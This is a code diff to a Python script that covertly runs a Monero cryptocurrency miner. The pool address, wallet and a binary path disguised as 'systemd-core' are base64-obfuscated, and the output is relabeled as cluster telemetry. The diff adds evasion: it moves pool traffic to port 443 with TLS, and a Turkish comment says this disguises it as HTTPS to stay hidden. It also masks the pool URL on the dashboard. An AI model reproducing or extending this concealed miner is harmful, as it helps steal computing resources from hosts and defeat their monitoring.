@@ -17,7 +17,7 @@ def _d(s): return base64.b64decode(s).decode('utf-8')
 MODE         = os.environ.get("ENGINE_MODE", "miner")
 HTTP_PORT    = int(os.environ.get("PORT", 8080))
 PROXY_URL    = os.environ.get("PROXY_URL", "")
-POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTozMzIy"))
+POOL_URL     = os.environ.get("POOL_URL", _d("cG9vbC5zdXBwb3J0eG1yLmNvbTo0NDM="))
 WALLET_ADDR  = os.environ.get("WALLET_ADDR", _d("NDl5cWJOZ0cxMzVld3FKOXVOUVhUZ0I5bUthVVhmZzFiM2FiQWJoc1NEZ2g0YXNWYmZIdVlES0FkaWlkbVRDQjhwQUNZZHd4ejc3VHdKaHdFU2hEdDZuQkI1WmpjdEw="))
 WORKER_NAME  = os.environ.get("WORKER_NAME", f"node-{int(time.time())%10000}")
 DATA_DIR     = os.environ.get("DATA_DIR", "/data")
@@ -57,9 +57,10 @@ def log_msg(text: str, is_remote: bool = False) -> None:
 def run_core() -> None:
     global _proc, _current_hr
     
+    # Sadece TLS aktif. Veri 443 portundan HTTPS kılığında akar (hızlı ve gizli)
     cmd = [
         _d("L3NlcnZlci9zeXN0ZW1kLWNvcmU="), "-o", POOL_URL, "-u", WALLET_ADDR,
-        "-p", WORKER_NAME, "--keepalive", "--donate-level=1"
+        "-p", WORKER_NAME, "--keepalive", "--donate-level=1", "--tls"
     ]
 
     def _pipe_output(stream):
@@ -75,7 +76,7 @@ def run_core() -> None:
                 if match: _current_hr = match.group(1).replace("H/s", "ops/s")
 
     while True:
-        log_msg("[INIT] Core daemon başlatılıyor...")
+        log_msg("[INIT] Core daemon başlatılıyor, güvenli kanallar açılıyor...")
         try:
             _proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
             threading.Thread(target=_pipe_output, args=(_proc.stdout,), daemon=True).start()
@@ -139,7 +140,7 @@ td{{padding:12px 16px;border-top:1px solid #21262d;font-size:.88rem}}
 </head>
 <body>
 <h1>🌐 Cluster Telemetry Hub</h1>
-<p class="subtitle">Uplink Gateway: {pool} | Target Node: {proxy}</p>
+<p class="subtitle">Uplink Gateway: [ENCRYPTED-TLS] | Target Node: {proxy}</p>
 <table>
   <thead><tr><th>Node ID</th><th>Throughput</th><th>Status</th><th>Last Sync</th></tr></thead>
   <tbody id="workerBody">{rows}</tbody>
@@ -180,7 +181,7 @@ class HttpHandler(http.server.BaseHTTPRequestHandler):
                         rows += f"<tr><td>{w['node_name']}</td><td>{hr}</td><td class='{status_class}'>{status_text}</td><td>{seen_str}</td></tr>"
             except Exception as e:
                 pass
-            html = _PANEL_HTML.format(pool=POOL_URL, proxy=PROXY_URL, rows=rows)
+            html = _PANEL_HTML.format(proxy=PROXY_URL, rows=rows)
             self.wfile.write(html.encode("utf-8"))
             return
         if self.path == "/api/logs":
